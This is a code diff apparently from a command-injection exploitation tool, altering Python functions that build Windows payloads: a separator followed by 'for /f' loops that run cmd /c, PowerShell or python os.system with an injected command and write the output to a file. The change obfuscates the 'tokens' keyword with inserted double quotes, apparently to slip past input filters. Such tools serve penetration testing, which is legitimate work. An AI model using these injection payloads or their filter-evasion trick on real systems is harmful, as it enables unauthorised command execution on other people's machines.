@@ -46,7 +46,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c " + 
+              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
               python_payload +
               "') do @set /p =%i< nul"
               )
@@ -78,7 +78,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
 
   elif settings.TARGET_OS == "win":
     payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c \"" +
+              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
               "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd + 
               "\")\"') do @set /p =%i " + ">" + OUTPUT_TEXTFILE + "< nul"
@@ -107,7 +107,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
     else:
       python_payload = settings.WIN_PYTHON_DIR + " -c \"import os; os.system('" + cmd + ">" + OUTPUT_TEXTFILE + "')\""
       payload = (separator +
-                "for /f \"tokens=*\" %i in ('cmd /c " + 
+                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do @set /p =%i< nul"
                 )
